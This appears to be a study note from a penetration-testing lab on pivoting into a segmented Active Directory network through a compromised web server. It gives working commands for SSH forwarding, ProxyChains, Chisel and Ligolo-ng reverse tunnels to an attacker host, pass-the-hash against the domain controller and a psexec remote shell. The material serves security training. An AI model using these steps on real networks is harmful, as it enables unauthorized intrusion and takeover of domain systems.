# 🕳️ Pivoting

> **Topic:** Intro to AD Lateral Movement
>
> **Focus:** Using a compromised host as a relay to reach restricted internal networks.

---

# 📖 Overview

An attacker may have valid credentials but still be unable to reach the target because of network segmentation.

Example:

```text
AttackBox
    X
    |
    X
Domain Controller
```

A compromised host may have access to both networks:

```text
AttackBox
    ↓
Compromised WebServer
    ↓
Internal Network
    ↓
Domain Controller
```

This is **pivoting**.

---

# 🎯 Why Pivoting Matters

In the supplied lab:

- The AttackBox can reach the WebServer.
- The WebServer can reach internal systems.
- The Domain Controller is not directly reachable from the AttackBox.

The compromised WebServer therefore becomes the pivot.

---

# 🧭 Initial Connectivity Test

Attempting to reach the DC directly:

```bash
nxc smb 192.168.13.100 -u Administrator -H 25.....ea --timeout 5
```

The connection times out.

The internal WebServer service also cannot be reached directly:

```bash
curl --connect-timeout 5 http://192.168.13.71
```

Result:

```text
Connection timed out
```

---

# 🔀 SSH Port Forwarding

Two SSH forwarding modes are covered:

```text
Local Port Forwarding
Dynamic Port Forwarding
```

---

# 1️⃣ Local Port Forwarding

SSH `-L` creates a local listening port and forwards traffic to a specific internal destination.

Example:

```bash
ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
```

---

# 🔍 Breaking Down the Command

```text
-L 13389:192.168.13.100:3389
```

Means:

```text
AttackBox port 13389
       ↓
SSH Tunnel
       ↓
WebServer
       ↓
192.168.13.100:3389
```

```text
jdoe@192.168.13.71
```

The WebServer is the pivot host.

```text
-N
```

Means no remote command should be executed; only the tunnel is needed.

---

# 🖥️ Accessing RDP Through the Tunnel

In another terminal:

```bash
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'NotTheCorrectPassword' /cert:ignore
```

The password in the supplied example is intentionally incorrect, but the important point is that the connection travels:

```text
AttackBox
 ↓
127.0.0.1:13389
 ↓
SSH
 ↓
WebServer
 ↓
DC:3389
```

---

# 2️⃣ Dynamic Port Forwarding / SOCKS

Dynamic forwarding is more flexible.

```bash
ssh -f -D 1080 jdoe@192.168.13.71 -N
```

This creates a SOCKS proxy:

```text
127.0.0.1:1080
```

---

# 🧩 Why SOCKS Is Useful

Unlike `-L`, which forwards one predefined destination, SOCKS can route traffic to multiple internal hosts and ports.

```text
AttackBox
   ↓
SOCKS 1080
   ↓
SSH Tunnel
   ↓
WebServer
   ↓
Internal Network
 ┌─┴──────────────┐
 ↓                ↓
SERVER1           DC
```

---

# 3️⃣ ProxyChains Configuration

Edit:

```text
/etc/proxychains.conf
```

The supplied configuration ends with:

```text
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
#socks4  127.0.0.1 9050
socks4 127.0.0.1 1080
```

---

# 🌐 Test Through ProxyChains

The supplied material demonstrates accessing the WebServer's internal web service:

```bash
proxychains curl -s http://192.168.13.71 | head -20
```

The Gitea page becomes reachable through the tunnel.

---

# 🔍 Reach the Domain Controller

Test the Domain Admin hash through the proxy:

```bash
proxychains nxc smb 192.168.13.100 -u Administrator -H 250......ea
```

The expected lab indicator is:

```text
(Pwn3d!)
```

---

# 💻 Remote Shell Through the Pivot

```bash
proxychains psexec.py -hashes :25.....ea thm.loc/Administrator@192.168.13.100
```

The supplied lab reaches:

```cmd
C:\Windows\system32>
```

Verify:

```cmd
hostname
```

Result:

```text
RDC1
```

---

# ⚠️ ProxyChains Caveats

The supplied material highlights several important limitations.

## TCP Only

ProxyChains handles TCP traffic.

UDP and ICMP are not supported through the SOCKS tunnel.

Therefore:

```text
nmap -sU
```

and:

```text
ping
```

will not work as expected.

---

# 🛰️ Nmap Through SOCKS

Use:

```text
-sT
```

instead of:

```text
-sS
```

because SYN scans require raw sockets.

Also use:

```text
-Pn
```

to skip host discovery because ICMP may fail through the proxy.

Conceptually:

```bash
proxychains nmap -sT -Pn TARGET
```

---

# 🌐 DNS Considerations

DNS may leak if hostnames are resolved locally before traffic enters the proxy.

The supplied material recommends enabling:

```text
proxy_dns
```

in ProxyChains when using hostnames.

---

# 4️⃣ Chisel

Chisel is a portable TCP tunnelling tool that works over HTTP.

It can be useful when SSH is unavailable.

---

## AttackBox — Server

```bash
chisel server --port 8080 --reverse
```

## Compromised Windows Host — Client

```cmd
chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
```

This provides a SOCKS proxy similar to SSH dynamic forwarding.

---

# 5️⃣ Ligolo-ng

Ligolo-ng takes a different approach.

Instead of relying on ProxyChains and SOCKS, it creates a virtual TUN interface.

Concept:

```text
AttackBox
   ↓
TUN Interface
   ↓
Ligolo-ng Tunnel
   ↓
Compromised Host
   ↓
Internal Network
```

---

## AttackBox

```bash
sudo ./proxy -selfcert
```

## Agent

```bash
./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT
```

## Add Route

```bash
sudo ip route add 192.168.13.0/24 dev ligolo
```

Then tools can operate directly against the internal network:

```bash
nxc smb 192.168.13.0/24 -u jdoe -p 'Summer2026!'
```

---

# 🔄 SSH vs Chisel vs Ligolo-ng

| Tool | Approach | Main Advantage |
|---|---|---|
| SSH | Local / Dynamic forwarding | Simple and widely available |
| Chisel | HTTP-based tunnelling | Useful when SSH is unavailable |
| Ligolo-ng | TUN interface | Native routing without ProxyChains |

The supplied material recommends SSH as the starting point for this room and identifies Ligolo-ng as useful for more complex engagements.

---

# 🧠 Key Takeaways

- Pivoting uses a compromised host as a relay.
- `ssh -L` forwards a specific local port.
- `ssh -D` creates a dynamic SOCKS proxy.
- ProxyChains can route compatible TCP tools through SOCKS.
- ProxyChains does not handle UDP/ICMP normally.
- Use `nmap -sT -Pn` through a SOCKS setup.
- DNS resolution can leak outside the tunnel.
- Chisel provides HTTP-based tunnelling.
- Ligolo-ng creates a virtual TUN interface.
